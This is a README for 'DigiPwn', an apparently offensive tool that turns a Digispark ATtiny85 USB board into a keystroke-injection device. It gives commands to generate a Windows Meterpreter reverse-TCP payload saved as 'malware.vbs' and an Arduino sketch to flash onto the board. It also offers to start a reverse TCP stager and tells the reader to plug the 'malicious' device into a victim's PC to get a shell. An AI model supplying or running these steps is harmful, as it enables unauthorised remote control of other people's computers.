# ![Image of DigiPwn Logo](https://i.imgur.com/mDVQ4Jw.png)
# DigiPwn
Digispark KickStarter ATtiny85 USB Development Board The ATtiny85 based mini development board is similar to the Arduino, 
but cheaper and smaller (of course a bit less powerful). With a whole host of shields to extend its functionality and the 
ability to use the familiar Arduino IDE, this board is a great way to jump into microcontroller electronics.

# Requirements
 - [Python 2.7](https://www.python.org/downloads/)
 - [Arduino](https://www.arduino.cc/en/Main/Software)
 - Setup DigiSpark board in Arduino. [Click here for how-to.](https://digistump.com/wiki/digispark/tutorials/connecting).
 - Requires module [impacket](https://github.com/SecureAuthCorp/impacket).
# Installation 
 - First clone the repo
  `git clone https://github.com/zer0overflow/DigiPwn.git`
 - Then run `python DigiPwn.py [HOST] [PORT] [PAYLOAD] [OUTPUT FILE] [FORMAT]`
   
   Example: `python DigiPwn.py 192.168.1.2 8080 windows/meterpreter/reverse_tcp malware.vbs vbs`
   
 - A file named `keystroke_inject.ino` will be created. Upload that code using Arduino.
 
 - The program will ask you if you want to start a reverse tcp stager. Press y and then enter to start one.
 
 - Plug the malcious DigiSpark to victim's PC and **BOOM! You've a shell!**

 Follow me on Instagram
 
 [https://www.instagram.com/zero.overflow](https://www.instagram.com/zero.overflow)
 [My website](https://zer0overflow.github.io/)
